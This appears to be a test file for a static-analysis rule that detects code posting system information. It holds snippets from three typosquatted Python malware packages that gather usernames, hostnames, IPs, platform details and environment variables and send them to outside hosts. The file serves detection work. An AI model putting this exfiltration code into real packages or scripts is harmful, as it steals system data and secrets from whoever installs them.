""" Tests for post-systeminfo rule

    OK cases:
      - sending non-sensitive information
      - using system information without sending
    RULEID cases:
      - distrib
      - tenserflow
      - python-mysql
"""


""" OK: sending non-sensitive information
"""
sender = RequestSender()
rest_request = RESTRequest('POST', 'http://localhost/test',
                            headers={'Test-Header': '1234'},
                            body='{"test": "value"}')
# ok: post-systeminfo
sender.send(rest_request)


""" OK: using system information without sending
"""
if user_name is None:
  # ok: post-systeminfo
  user_name = getpass.getuser()
  
  
""" RULEID: distrib malware
"""
info = socket.gethostname()+' '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
posty = "paste="
for i in xrange(0,len(info)):
  if info[i].isalnum():
    posty += info[i]
  else:
    posty += ("%%%02X" % ord(info[i]))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("packageman.comlu.com", 80))
# ruleid: post-systeminfo
s.send("POST / HTTP/1.1\r\n"+
"User-Agent: Python\r\n"+
"Host: packageman.comlu.com\r\n"+
"Content-Type: application/x-www-form-urlencoded\r\n"+
"Content-Length: "+str(len(posty))+"\r\n\r\n"+posty)


""" RULEID: tenserflow malware
"""
def request(url, method='GET', data=None, headers=None):
  try:
      import urllib2 as urlrequest
  except:
      import urllib.request as urlrequest

  req = urlrequest.Request(url=url, data=data, headers=headers)
  return urlrequest.urlopen(req, timeout=10).read()

def detect():
  username = getpass.getuser()
  hostinfo = platform.uname()
  ip = socket.gethostname()
  data = {
      "title": "%s@%s@tenserflow" % (username, ip),
      "body": str(hostinfo)
  }
  headers = {
      'Content-Type': 'application/json'
  }
  # ruleid: post-systeminfo
  request(
      url='http://us.dslab.pw/webhook.php',
      method='POST',
      data=json.dumps(data).encode("utf-8", errors='ignore'),
      headers=headers
  )


""" RULEID: python-mysql malware
"""
def checkVersion():
  user_name = getpass.getuser()
  hostname = socket.gethostname()
  os_version = platform.platform()
  if platform.system() is 'Windows':
      import ctypes
      import locale
      dll_handle = ctypes.windll.kernel32
      loc_lang = locale.getdefaultlocale()
      language = ':'.join(loc_lang)
  elif platform.system() is 'Linux':
      loc_lang = os.popen("echo $LANG")
      language = loc_lang.rea
  ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  package='pysprak'
  vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
  if sys.version_info>(3,0):
    # ruleid: post-systeminfo
    request.urlopen(r'http://numipy.openvc.org/spark.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
  elif sys.version_info<(3,0):
    # ruleid: post-systeminfo
    urllib.urlopen(r'http://numipy.openvc.org/spark.php','vid='+base64.encodestring(vid))